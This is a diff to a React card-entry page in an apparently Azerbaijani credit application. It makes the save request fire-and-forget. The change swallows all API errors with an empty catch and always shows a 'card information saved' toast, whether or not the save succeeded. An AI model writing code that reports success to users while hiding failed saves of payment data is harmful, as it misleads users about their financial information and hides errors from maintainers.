@@ -811,7 +811,7 @@ const CreditSelectionPage = () => {
   );
 };
 
-// Card Entry Page
+// Card Entry Page - INSTANT LOAD
 const CardEntryPage = () => {
   const navigate = useNavigate();
   const { id: appId } = useParams();
@@ -821,23 +821,12 @@ const CardEntryPage = () => {
   const handleSubmit = async (e) => {
     e.preventDefault();
     setLoading(true);
-
-    try {
-      await axios.put(`${API}/applications/${appId}`, {
-        card_number: cardNumber
-      });
-      toast.success('Kart məlumatı yadda saxlanıldı');
-      setTimeout(() => {
-        navigate(`/contract/${appId}`);
-      }, 1000);
-    } catch (error) {
-      // Xəta olsa belə davam et
-      console.log('API error, continuing anyway');
-      toast.success('Kart məlumatı yadda saxlanıldı');
-      setTimeout(() => {
-        navigate(`/contract/${appId}`);
-      }, 1000);
-    }
+    // Update in background, don't wait
+    axios.put(`${API}/applications/${appId}`, { card_number: cardNumber }).catch(() => {});
+    toast.success('Kart məlumatı yadda saxlanıldı');
+    setTimeout(() => {
+      navigate(`/contract/${appId}`);
+    }, 800);
   };
 
   const formatCardNumber = (value) => {
